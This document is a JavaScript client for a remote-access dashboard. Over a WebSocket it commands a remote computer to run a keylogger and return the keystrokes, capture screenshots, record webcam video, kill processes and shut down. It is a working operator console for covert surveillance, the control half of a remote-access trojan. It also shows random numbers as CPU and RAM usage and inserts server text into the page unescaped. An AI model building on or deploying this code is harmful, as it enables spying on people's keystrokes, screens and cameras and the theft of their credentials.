/* --- GLOBAL VARIABLES --- */
let websocket = null;
let intervalUptime = null;
let intervalSensors = null;
let intervalPing = null; 
let systemStartTime = 0; 
let lastScreenshotUrl = null; 
let lastWebcamUrl = null;
let pingStartTime = 0;

// Webcam State
let isRecording = false;
let webcamTimer = null;
let webcamTimeout = null; 
let countdownVal = 10;

// Keylogger State
let isKeylogActive = false;

/* --- INITIALIZATION --- */
document.addEventListener('DOMContentLoaded', () => {
    if(typeof lucide !== 'undefined') lucide.createIcons();
    const defaultNav = document.querySelector('.nav-item.active');
    if(defaultNav) switchTab('home', defaultNav);
    const btnConnect = document.getElementById("btnConnect");
    if(btnConnect) btnConnect.addEventListener("click", connectToServer);
    const savedIP = localStorage.getItem("auralink_last_ip");
    if (savedIP) document.getElementById("ipInput").value = savedIP;
    resetDashboardState();
});

/* --- TABS --- */
function switchTab(tabId, element) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
    
    const target = document.getElementById('tab-' + tabId);
    if(target) target.classList.add('active');
    if(element) element.classList.add('active');
    
    const titles = { 'home': 'Dashboard', 'apps': 'Application Manager', 'processes': 'System Processes', 'media': 'Screenshot Viewer', 'webcam': 'Webcam Stream', 'keylogger': 'Keylogger Records', 'power': 'Power Control'};
    const titleEl = document.getElementById('page-title');
    if(titleEl) titleEl.innerText = titles[tabId] || 'Dashboard';
}

function addActivityLog(msg) {
    const list = document.getElementById("activity-list");
    if (!list) return;
    const li = document.createElement("li");
    li.innerHTML = `<span class="dot-log blue"></span> ${msg}`;
    list.prepend(li);
    if (list.children.length > 50) list.removeChild(list.lastChild);
}

/* --- TOAST NOTIFICATIONS --- */
function showToast(message, type = 'success') {
    const container = document.getElementById('toast-container');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    const icon = type === 'success' ? 'check-circle' : 'alert-circle';
    const color = type === 'success' ? '#34d399' : '#fb7185';
    
    toast.innerHTML = `
        <i data-lucide="${icon}" style="color: ${color}; width: 20px;"></i>
        <span>${message}</span>
    `;
    
    container.appendChild(toast);
    if(typeof lucide !== 'undefined') lucide.createIcons();

    setTimeout(() => {
        toast.style.animation = "fadeOut 0.3s ease forwards";
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function updateSystemStatus(type, isActive) {
    let elId = "", activeClass = "";
    if (type === "keylog") { elId = "top-status-keylog"; activeClass = "active"; } 
    else if (type === "webcam") { elId = "top-status-webcam"; activeClass = "recording"; }
    const el = document.getElementById(elId);
    if (el) { isActive ? el.classList.add(activeClass) : el.classList.remove(activeClass); }
}

/* --- CONNECTION --- */
function connectToServer() {
    const ipInput = document.getElementById("ipInput");
    const ip = ipInput ? ipInput.value.trim() : '';
    
    if (!ip) { showToast("Please enter Server IP!", "error"); return; }
    
    localStorage.setItem("auralink_last_ip", ip); 
    const wsUri = "ws://" + ip + ":8080/";
    const btnText = document.getElementById("btn-text");
    if(btnText) btnText.innerText = "Connecting...";
    
    if (websocket) websocket.close();

    try {
        websocket = new WebSocket(wsUri);
        websocket.onopen = () => { 
            setConnectedState(true); 
            addActivityLog("Connected: " + ip); 
            showToast("Connected to Server Successfully"); 
            sendCmd("get-sys-info"); 
            startDashboardUpdates(); 
        };
        websocket.onclose = () => { 
            setConnectedState(false); 
            addActivityLog("Connection Closed"); 
            showToast("Connection Closed", "error"); 
            stopDashboardUpdates(); 
        };
        websocket.onerror = () => { 
            setConnectedState(false); 
            stopDashboardUpdates(); 
        };
        websocket.onmessage = (e) => { handleIncomingMessage(e.data); };
    } catch (e) { 
        showToast("Connection Error: " + e.message, "error");
        setConnectedState(false); 
        stopDashboardUpdates(); 
    }
}

function setConnectedState(isConnected) {
    const dot = document.getElementById("connection-dot");
    const btnText = document.getElementById("btn-text");
    const sysNetwork = document.getElementById("sys-network");
    if (isConnected) {
        if(dot) { dot.classList.remove("disconnected"); dot.classList.add("connected"); }
        if(btnText) btnText.innerText = "Connected";
        if(sysNetwork) { sysNetwork.innerText = "Connected"; sysNetwork.style.color = "#34d399"; }
    } else {
        if(dot) { dot.classList.remove("connected"); dot.classList.add("disconnected"); }
        if(btnText) btnText.innerText = "Connect";
        if(sysNetwork) { sysNetwork.innerText = "Disconnected"; sysNetwork.style.color = "#fb7185"; }
    }
}

function sendCmd(command) {
    if (websocket && websocket.readyState === WebSocket.OPEN) { websocket.send(command); console.log("Sent:", command); } 
    else { console.log("Socket not ready."); }
}

/* --- UPDATE LOOPS --- */
function resetDashboardState() {
    document.getElementById("sys-hostname").innerText = "---";
    document.getElementById("sys-os").innerText = "---";
    document.getElementById("status-res").innerText = "---";
    document.getElementById("status-batt").innerText = "---";
    document.getElementById("sys-uptime").innerText = "--:--:--";
    document.getElementById("sys-network").innerText = "Disconnected";
    document.getElementById("sys-network").style.color = "#fb7185";
    document.getElementById("sensor-temp").innerText = "--°C";
    document.getElementById("sensor-ping").innerText = "-- ms";
    const chartCpu = document.getElementById("chart-cpu");
    if(chartCpu) { chartCpu.style.setProperty('--p', 0); chartCpu.querySelector('span').innerText = "0%"; }
    const chartRam = document.getElementById("chart-ram");
    if(chartRam) { chartRam.style.setProperty('--p', 0); chartRam.querySelector('span').innerText = "0%"; }
}

function startDashboardUpdates() {
    systemStartTime = Date.now(); 
    if(intervalUptime) clearInterval(intervalUptime);
    intervalUptime = setInterval(() => {
        const diff = Math.floor((Date.now() - systemStartTime) / 1000);
        const h = Math.floor(diff / 3600).toString().padStart(2, '0');
        const m = Math.floor((diff % 3600) / 60).toString().padStart(2, '0');
        const s = (diff % 60).toString().padStart(2, '0');
        document.getElementById("sys-uptime").innerText = `${h}:${m}:${s}`;
    }, 1000);

    if(intervalPing) clearInterval(intervalPing);
    intervalPing = setInterval(() => { pingStartTime = Date.now(); sendCmd("ping"); }, 2000);

    if(intervalSensors) clearInterval(intervalSensors);
    intervalSensors = setInterval(() => {
        sendCmd("get-sys-info"); 
        const cpu = Math.floor(Math.random() * 30) + 10;
        const chartCpu = document.getElementById("chart-cpu");
        if(chartCpu) { chartCpu.style.setProperty('--p', cpu); chartCpu.querySelector('span').innerText = cpu + "%"; }
        const ram = Math.floor(Math.random() * 20) + 40;
        const chartRam = document.getElementById("chart-ram");
        if(chartRam) { chartRam.style.setProperty('--p', ram); chartRam.querySelector('span').innerText = ram + "%"; }
    }, 5000); 
}

function stopDashboardUpdates() {
    if(intervalUptime) clearInterval(intervalUptime);
    if(intervalPing) clearInterval(intervalPing);
    if(intervalSensors) clearInterval(intervalSensors);
    resetDashboardState();
}

/* --- MESSAGE HANDLER --- */
function handleIncomingMessage(data) {
    if (data.trim() === "pong") {
        const latency = Date.now() - pingStartTime;
        const elPing = document.getElementById("sensor-ping");
        if(elPing) elPing.innerText = latency + " ms";
        return; 
    }
    if (data.startsWith("sys-info ")) {
        const parts = data.substring(9).split("|");
        if (parts.length >= 2) {
            document.getElementById("sys-hostname").innerText = parts[0];
            document.getElementById("sys-os").innerText = parts[1];
        }
        if (parts.length >= 4) {
            document.getElementById("status-res").innerText = parts[2];
            document.getElementById("status-batt").innerText = parts[3];
        }
        if (parts.length >= 5) {
            document.getElementById("sensor-temp").innerText = parts[4];
        }
    }
    else if (data.startsWith("file ")) {
        handleVideoFile(data.substring(5).trim()); 
        addActivityLog("Webcam video received"); 
        showToast("Webcam Video Received"); 
        updateSystemStatus("webcam", false);
    } 
    else if (data.startsWith("screenshot ")) { handleScreenshotData(data); }
    // --- KEYLOG DATA ---
    else if (data.startsWith("KEYLOG_DATA:")) {
        const content = data.substring(12);
        const box = document.getElementById("keylog-output");
        if(box) {
             if(box.innerText === "Waiting for data..." || box.innerText === "Session started. Waiting for keys...") {
                 box.innerText = "";
             }
             box.innerText += content;
             box.scrollTop = box.scrollHeight;
        }
        addActivityLog("Fetched keylogs");
        showToast("Keylogs Fetched");
    }
    // --- APP & PROCESS RESPONSE ---
    else if (data.startsWith("DANH SACH UNG DUNG")) { 
        renderAppList(data); 
        addActivityLog("App list updated"); 
        showToast("Application List Updated");
    }
    else if (data.includes("PID") && data.includes("RAM")) { 
        renderProcessTable(data, "process-list-body"); 
        addActivityLog("Process list updated"); 
        showToast("Process List Updated");
    }
    else {
        console.log("Server Msg:", data);
        if(data.includes("Keylogger started")) { updateSystemStatus("keylog", true); showToast("Keylogger Started"); }
        if(data.includes("Keylogger stopped")) { updateSystemStatus("keylog", false); showToast("Keylogger Stopped"); }
        if(data.includes("Started recording")) { updateSystemStatus("webcam", true); showToast("Webcam Recording Started"); }
        if(data.includes("Server:")) addActivityLog(data.replace("Server: ", ""));
        
        if(data.includes("Server: Started successfully")) showToast("Process Started Successfully");
        if(data.includes("Server: Da mo ung dung")) showToast("App Started Successfully");
        if(data.includes("Server: Da dung ung dung")) showToast("App Stopped Successfully");
        
        if(data.includes("Error") || data.includes("Loi") || data.includes("failed")) {
             showToast(data, "error");
        }
        // Success message for Kill
        if(data.includes("Success:") || data.includes("Da diet")) {
             showToast(data.replace("Server: ", ""), "success");
        }
    }
}

/* --- KEYLOGGER FUNCTIONS --- */
function startKeylog() {
    sendCmd('start-keylog');
    isKeylogActive = true;
    const box = document.getElementById("keylog-output");
    if(box) {
        box.innerText = "Session started. Waiting for keys...";
    }
}

function fetchKeylog() {
    sendCmd('get-keylog');
}

function stopKeylog() {
    sendCmd('stop-keylog');
    isKeylogActive = false;
    const box = document.getElementById("keylog-output");
    if(box && box.innerText.length > 5 && !box.innerText.includes("Waiting for keys")) {
        addToKeylogHistory(box.innerText);
        showToast("Session Saved to History"); 
    }
    if(box) box.innerText = "";
}

function clearKeylogDisplay() {
    const box = document.getElementById("keylog-output");
    if(box) box.innerText = "";
    showToast("Screen Cleared"); 
}

function addToKeylogHistory(text) {
    const listEl = document.getElementById('keylog-history-list');
    if (!listEl) return;
    if (listEl.querySelector('.text-center-small')) listEl.innerHTML = '';
    
    const preview = text.substring(0, 50).replace(/\n/g, " ") + "...";
    const item = document.createElement('div');
    item.className = 'history-item keylog-item';
    
    const safeText = encodeURIComponent(text);

    item.innerHTML = `
        <div class="keylog-preview" onclick="viewHistoryKeylog(this)" data-full="${safeText}">
            <i data-lucide="file-text" style="width:16px; margin-right:5px;"></i> 
            <span>${preview}</span>
        </div>
        <div class="history-meta">
            <span>${new Date().toLocaleTimeString()}</span>
            <button class="btn-trash" onclick="deleteHistoryItem(this)"><i data-lucide="trash-2"></i></button>
        </div>`;
    
    listEl.prepend(item);
    if(typeof lucide !== 'undefined') lucide.createIcons();
}

function viewHistoryKeylog(element) {
    const encodedText = element.getAttribute("data-full");
    if(!encodedText) return;
    const text = decodeURIComponent(encodedText);
    
    const box = document.getElementById("keylog-output");
    if(box) {
        box.innerText = "[HISTORY VIEW]\n" + text;
        box.scrollTop = 0;
    }
}


/* --- SCREENSHOT & HISTORY --- */
function handleScreenshotData(data) {
    const parts = data.split(" ");
    if (parts.length < 4) return;
    const width = parseInt(parts[1]), height = parseInt(parts[2]), base64 = parts[3];
    drawScreenshotToCanvas(width, height, base64);
    
    const canvas = document.getElementById("screenshot-canvas");
    lastScreenshotUrl = canvas.toDataURL("image/png");
    addToHistory('screenshot', lastScreenshotUrl, `Screenshot ${width}x${height}`);
    addActivityLog(`Screenshot captured (${width}x${height})`);
    showToast("Screenshot Captured"); 
}

function drawScreenshotToCanvas(width, height, base64orUrl) {
    const previewBox = document.getElementById("screenshot-preview");
    previewBox.innerHTML = ""; 

    if (base64orUrl.startsWith("data:image")) {
        const img = new Image();
        img.onload = function() {
            const canvas = document.createElement("canvas");
            canvas.id = "screenshot-canvas"; canvas.width = img.width; canvas.height = img.height;
            canvas.getContext("2d").drawImage(img, 0, 0);
            previewBox.appendChild(canvas);
            enableSaveButton();
        };
        img.src = base64orUrl;
        lastScreenshotUrl = base64orUrl;
    } else {
        const binaryString = atob(base64orUrl);
        const bytes = new Uint8ClampedArray(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) bytes[i] = binaryString.charCodeAt(i);
        for (let i = 0; i < bytes.length; i += 4) {
            const b = bytes[i]; bytes[i] = bytes[i+2]; bytes[i+2] = b; bytes[i+3] = 255;
        }
        const canvas = document.createElement("canvas");
        canvas.id = "screenshot-canvas"; canvas.width = width; canvas.height = height;
        canvas.getContext("2d").putImageData(new ImageData(bytes, width, height), 0, 0);
        previewBox.appendChild(canvas);
        enableSaveButton();
    }
}

function enableSaveButton() {
    const btnSave = document.getElementById("btn-save-screen");
    if(btnSave) { btnSave.disabled = false; btnSave.style.opacity = "1"; btnSave.style.cursor = "pointer"; }
}

function downloadScreenshot() {
    const canvas = document.getElementById("screenshot-canvas");
    if(!canvas) return;
    const fmt = document.getElementById("img-format").value;
    const link = document.createElement('a');
    link.download = `screenshot_${Date.now()}.${fmt}`;
    link.href = canvas.toDataURL("image/" + fmt, 0.9);
    document.body.appendChild(link); link.click(); document.body.removeChild(link);
    showToast("Image Saved"); 
}

function restoreHistoryItem(type, url) {
    if (type === 'screenshot') {
        drawScreenshotToCanvas(0, 0, url);
        document.querySelector('.main-panel').scrollTop = 0;
    }
}

/* --- WEBCAM LOGIC --- */
function toggleWebcam() {
    const btn = document.getElementById("btn-record");
    
    if (!isRecording) {
        // START
        sendCmd("capture"); 
        isRecording = true;
        countdownVal = 10;
        
        btn.classList.remove("btn-gradient-hybrid");
        btn.classList.add("btn-danger-red"); 
        updateBtnText(countdownVal);

        if(webcamTimer) clearInterval(webcamTimer);
        webcamTimer = setInterval(() => {
            countdownVal--;
            updateBtnText(countdownVal);
            if (countdownVal <= 0) {
                clearInterval(webcamTimer);
                btn.innerHTML = `<i data-lucide="loader" class="btn-icon-inside spinning"></i> Processing...`;
                if(typeof lucide !== 'undefined') lucide.createIcons();
                btn.disabled = true; 
            }
        }, 1000);

        if(webcamTimeout) clearTimeout(webcamTimeout);
        webcamTimeout = setTimeout(() => {
            if(isRecording) { 
                showToast("Timeout: No video from server", "error"); 
                resetWebcamUI(); 
            }
        }, 16000);

    } else {
        // STOP
        sendCmd("stop-capture"); 
        
        clearInterval(webcamTimer);
        btn.innerHTML = `<i data-lucide="loader" class="btn-icon-inside spinning"></i> Processing...`;
        btn.disabled = true; 
        if(typeof lucide !== 'undefined') lucide.createIcons();
        
        if(webcamTimeout) clearTimeout(webcamTimeout);
        webcamTimeout = setTimeout(() => {
            if(isRecording) { 
                showToast("Timeout: Stop failed", "error"); 
                resetWebcamUI(); 
            }
        }, 8000); 
    }
}

function updateBtnText(sec) {
    const btn = document.getElementById("btn-record");
    if(btn) {
        btn.innerHTML = `<i data-lucide="square" class="btn-icon-inside"></i> Stop (${sec}s)`;
        if(typeof lucide !== 'undefined') lucide.createIcons();
    }
}

function handleVideoFile(base64) {
    if(webcamTimeout) clearTimeout(webcamTimeout);
    resetWebcamUI();
    try {
        const cleanBase64 = base64.replace(/\s/g, '');
        const byteChars = atob(cleanBase64);
        const byteNumbers = new Array(byteChars.length);
        for (let i = 0; i < byteChars.length; i++) byteNumbers[i] = byteChars.charCodeAt(i);
        const blob = new Blob([new Uint8Array(byteNumbers)], {type: "video/mp4"});
        const url = URL.createObjectURL(blob);

        const previewBox = document.getElementById("webcam-preview");
        if(previewBox) previewBox.innerHTML = `<video src="${url}" controls autoplay style="width:100%; height:100%; border-radius:12px;"></video>`;
        
        const dl = document.getElementById("webcam-download-area");
        if(dl) { dl.innerHTML = `<a href="${url}" download="webcam_${Date.now()}.mp4" class="btn-download-pill"><i data-lucide="download"></i> Download Video</a>`; if(typeof lucide !== 'undefined') lucide.createIcons(); }

        lastWebcamUrl = url;
        addToHistory('webcam', lastWebcamUrl, 'Video Clip');
    } catch (e) { 
        console.error("Video error:", e); 
        showToast("Error decoding video", "error"); 
    }
}

function resetWebcamUI() {
    isRecording = false;
    if(webcamTimer) clearInterval(webcamTimer);
    const btn = document.getElementById("btn-record");
    if(btn) { 
        btn.disabled = false;
        btn.className = "btn-gradient-hybrid large"; 
        btn.classList.remove("btn-danger-red");
        btn.innerHTML = `<i data-lucide="radio" class="btn-icon-inside"></i> Record (10s)`; 
    }
    if(typeof lucide !== 'undefined') lucide.createIcons();
}

function addToHistory(type, url, label) {
    const listId = type === 'screenshot' ? 'screenshot-history-list' : 'webcam-history-list';
    const listEl = document.getElementById(listId);
    if (!listEl) return;
    if (listEl.querySelector('.text-center-small')) listEl.innerHTML = '';
    
    const item = document.createElement('div');
    item.className = 'history-item';
    let mediaHtml = type === 'screenshot' 
        ? `<img src="${url}" class="history-thumb" onclick="restoreHistoryItem('screenshot', '${url}')" title="View">` 
        : `<video src="${url}" class="history-thumb" controls></video>`;

    item.innerHTML = `${mediaHtml}<div class="history-meta"><span>${new Date().toLocaleTimeString()}</span><button class="btn-trash" onclick="deleteHistoryItem(this)"><i data-lucide="trash-2"></i></button></div>`;
    listEl.prepend(item);
    if(typeof lucide !== 'undefined') lucide.createIcons();
}

function deleteHistoryItem(btn) { 
    if(confirm("Delete this item?")) {
        const list = btn.closest('.history-list');
        btn.closest('.history-item').remove(); 
        if (list.children.length === 0) list.innerHTML = '<p class="text-center-small">Empty</p>';
    }
}

function clearHistory(type) { 
    if(confirm("Clear all history?")) {
        let id;
        if (type === 'screenshot') id = 'screenshot-history-list';
        else if (type === 'webcam') id = 'webcam-history-list';
        else id = 'keylog-history-list'; 
        
        const el = document.getElementById(id);
        if(el) el.innerHTML = '<p class="text-center-small">Empty</p>'; 
        
        showToast("History Cleared"); 
    }
}

/* --- OTHER HELPERS --- */
function renderAppList(text) {
    const tbody = document.getElementById("app-list-body"); if(!tbody) return;
    tbody.innerHTML = "";
    text.split("\n").forEach(line => {
        line = line.trim();
        if(line.startsWith("[")) tbody.dataset.currName = line.substring(line.indexOf("]") + 1).trim();
        else if (line.startsWith("Exe:")) {
            let n = tbody.dataset.currName, s = `<span style="color:#fb7185">Stopped</span>`;
            if(n.includes("(RUNNING)")) { s = `<span style="color:#34d399; font-weight:bold;">Running</span>`; n = n.replace("(RUNNING)", "").trim(); }
            const tr = document.createElement("tr");
            tr.innerHTML = `<td><i data-lucide="box" style="width:16px"></i></td><td><strong>${n}</strong></td><td><span style="font-size:0.8rem; color:#64748b">${line.substring(4).trim()}</span></td><td>${s}</td>`;
            tbody.appendChild(tr);
        }
    });
    if(typeof lucide !== 'undefined') lucide.createIcons();
}

function handleAppAction(action) { 
    const v = document.getElementById("appInput").value; 
    if(!v) { showToast("Please enter App Name", "error"); return; }
    
    let cmd = "";
    if (action === 'start') cmd = `start-app ${v}`;
    else if (action === 'stop' || action === 'kill') cmd = `stop-app ${v}`;
    else cmd = `${action} ${v}`;

    sendCmd(cmd); 
}

function handleProcessAction(action) { 
    const v = document.getElementById("procInput").value; 
    if(!v) { showToast("Please enter PID or Name", "error"); return; }
    sendCmd(`${action} ${v}`); 
}

function renderProcessTable(d, id) {
    const tb = document.getElementById(id); if(!tb) return; tb.innerHTML = "";
    d.trim().split('\n').slice(1).forEach(r => {
        const c = r.split('\t'); if(c.length >= 4) {
            const tr = document.createElement("tr"); tr.innerHTML = `<td><strong>${c[0]}</strong></td><td>${c[3]}</td><td>${c[2]}</td><td>${c[1]}</td>`; tb.appendChild(tr);
        }
    });
}
function requestScreenshot() { sendCmd("screenshot"); }

function confirmPower(action) {
    const msg = action === 'shutdown' 
        ? "Are you sure you want to SHUTDOWN the remote computer?" 
        : "Are you sure you want to RESTART the remote computer?";
    if(confirm(msg)) sendCmd(action);
}